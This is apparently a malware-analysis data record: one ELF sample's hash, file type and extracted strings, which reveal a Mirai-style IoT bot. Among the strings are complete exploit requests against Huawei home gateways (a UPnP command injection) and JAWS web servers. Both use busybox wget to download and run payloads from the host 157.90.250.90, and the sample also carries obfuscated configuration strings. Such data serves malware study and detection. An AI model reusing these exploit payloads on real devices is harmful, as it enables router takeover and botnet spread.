{
    "malware_data": [
        {
            "filename": "1f21e09f4da090783aa816fdb36fd530da92aea0fe7967f3ae8def43b2f27de7.elf",
            "filetype": "7F454C46",
            "filesize": "74KB",
            "hash_sha256": "1f21e09f4da090783aa816fdb36fd530da92aea0fe7967f3ae8def43b2f27de7",
            "strings": [
                "$h@@",
                ", (@",
                ", ,@",
                "&ch@",
                "$ $@",
                " ch@",
                "4!D@",
                "4!L@",
                "4 $@",
                "4!T@",
                "4 4@",
                "4 ,@",
                "4 <@",
                "4 D@",
                "4 L@",
                "4 T@",
                "4 \\@",
                "4 d@",
                "4 l@",
                "4 t@",
                "4 |@",
                "4!\\@",
                "4!d@",
                "4!$@",
                "4!4@",
                "4!,@",
                "4!<@",
                "4\"\\@",
                "4\"d@",
                "4\"l@",
                "4!l@",
                "4!t@",
                "4!|@",
                "4\"$@",
                "4\",@",
                "4\"4@",
                "4\"<@",
                "$\"@@",
                "4\"L@",
                "POST /cdn-cgi/",
                " HTTP/1.1",
                "User-Agent: ",
                "Host: ",
                "Cookie: ",
                "http",
                "url=",
                "POST",
                "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1",
                "Content-Length: 430",
                "Connection: keep-alive",
                "Accept: */*",
                "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"",
                "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 157.90.250.90 -l /tmp/.unstable -r /h0r0zx00xh0r0zx00xdefault/h0r0zx00x.mips; /bin/busybox chmod 777 * /tmp/.unstable; /tmp/.unstable huawei.exploit)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>",
                "_GET /shell?cd+/tmp;rm+-rf+*;wget+ 157.90.250.90/jaws;sh+/tmp/jaws HTTP/1.1",
                "User-Agent: Hello, world",
                "Host: 127.0.0.1:80",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "abcdefghijklmnopqrstuvw012345678",
                "vkkp",
                "pe^~D670=1<1=",
                "pwckmjckj",
                "wkhkoa}",
                "e`imj",
                "`abeqhp",
                "qwav",
                "cqawp",
                "pahjape`imj",
                "5555",
                "5670",
                "56701",
                "567012",
                "10765",
                "<<<<<<<<",
                "644<4<62",
                "222222",
                "<<<<<<",
                "5445glmj",
                "|g7155",
                "rm~|r",
                "nrf~`",
                "lc6|4",
                "^pa165",
                "cvkqpav",
                "pahjap",
                "kahmjq|567",
                "ph3<=",
                "CI<5<6",
                "lqjp131=",
                "pahagkie`imj",
                "psa<alkia",
                "jic|[setme",
                "tvmrepa",
                "efg567",
                "VKKP144",
                "elap~mt<",
                "ejok",
                "ewgaj`",
                "fhaj`av",
                "gep546=",
                "glejcaia",
                "m@mvagp",
                "jbhagpmkj",
                "mtgei[vp1714",
                "wswf~ocj",
                "nqejpagl",
                "teww",
                "tewwskv`",
                "wrck`ma",
                "p4pehg4jpv4h0%",
                "~lkjc|mjc",
                "~h||*",
                "~wqj55<<",
                "|il`mtg",
                "ohr567",
                "lm715<",
                "3qnIok4rm~|r",
                "3qnIok4e`imj",
                "`vaeifk|",
                "w}wpai",
                "msof",
                "vaehpao",
                "44444444",
                "56705670",
                "lqmcq74=",
                "smj5`ksw",
                "ejpwhu",
                "qjwpefha[mw[pla[lmwpkv}[kb[qjmravwa",
                "a~haeow*gki",
                "+tvkg+",
                "+a|a",
                "+ijp",
                "+wpepqw",
                "+tvkg+jap+pgt",
                "+gi`hmja",
                "+pit+",
                "+`epe+hkgeh+pit",
                "up|fkp",
                "imtw",
                "itwh",
                "fkp&Y",
                "leoem",
                "wlahh",
                "ajefha",
                "hmjq|wlahh",
                "+fmj+fqw}fk|$QJWPEFHA",
                "QJWPEFHA>$etthap$jkp$bkqj`",
                "jgkvvagp",
                "kcmj",
                "ewwskv`",
                "ajpav",
                "+`ar+sepgl`kc",
                "+`ar+imwg+sepgl`kc",
                "+wfmj+sepgl`kc",
                "+fmj+sepgl`kc",
                "+`ar+BPS@P545[sepgl`kc",
                "+`ar+BPS@P545+sepgl`kc",
                "+`ar+sepgl`kc4",
                "+apg+`abeqhp+sepgl`kc",
                "+apg+sepgl`kc",
                "eEw5606g41Bcn0",
                "PWkqvga$Ajcmja$Uqav}",
                "+apg+vawkhr*gkjb",
                "jeiawavrav$",
                "Gkjjagpmkj>$oaat)ehmra",
                "Eggatp>$pa|p+lpih(etthmgepmkj+|lpih/|ih(etthmgepmkj+|ih?u94*=(mieca+saft(.+.?u94*<",
                "Eggatp)Hejcqeca>$aj)QW(aj?u94*<",
                "Gkjpajp)P}ta>$etthmgepmkj+|)sss)bkvi)qvhajgk`a`",
                "wapGkkoma,#",
                "vabvawl>",
                "hkgepmkj>",
                "wap)gkkoma>",
                "gkjpajp)hajcpl>",
                "pvejwbav)ajgk`mjc>",
                "glqjoa`",
                "oaat)ehmra",
                "gkjjagpmkj>",
                "wavrav>$`kwevvawp",
                "wavrav>$ghkq`bheva)jcmj|",
                "Ik~mhhe+1*4$,Smj`ksw$JP$54*4?$SKS20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+15*4*6340*547$Webevm+173*72",
                "Ik~mhhe+1*4$,Smj`ksw$JP$54*4?$SKS20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+16*4*6307*552$Webevm+173*72",
                "Ik~mhhe+1*4$,Smj`ksw$JP$2*5?$SKS20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+15*4*6340*547$Webevm+173*72",
                "Ik~mhhe+1*4$,Smj`ksw$JP$2*5?$SKS20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+16*4*6307*552$Webevm+173*72",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54[55[2-$EtthaSafOmp+245*3*3$,OLPIH($hmoa$Cagok-$Ravwmkj+=*5*6$Webevm+245*3*3",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$1*5?$Pvm`ajp+1*4-",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$2*4?$Pvm`ajp+0*4?$CPF3*0?$MjbkTepl*7?$WR5?$*JAP$GHV$7*0*17724?$SKS20?$aj)QW-",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$2*5?$Pvm`ajp+0*4?$B@I?$IWMAGveshav?$Ia`me$Gajpav$TG$1*4-",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$2*5?$Pvm`ajp+0*4?$CPF3*0?$MjbkTepl*6?$WR5?$*JAP$GHV$0*0*1<3==?$SKS20?$aj)QW-",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$2*5?$Pvm`ajp+1*4?$BqjSafTvk`qgpw-",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54*2?$vr>61*4-$Cagok+64544545$Bmvabk|+61*4",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54*<?$vr>65*4-$Cagok+64544545$Bmvabk|+65*4",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54*<?$vr>60*4-$Cagok+64544545$Bmvabk|+60*4",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54[54?$vr>77*4-$Cagok+64544545$Bmvabk|+77*4",
                "Ik~mhhe+1*4$,Smj`ksw$JP$54*4?$Smj20?$|20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+26*4*7646*=0",
                "?/dev/null",
                "S[kA",
                ".shstrtab",
                ".init",
                ".text",
                ".fini",
                ".rodata",
                ".ctors",
                ".dtors",
                ".data",
                ".bss"
            ]
        }
    ]
}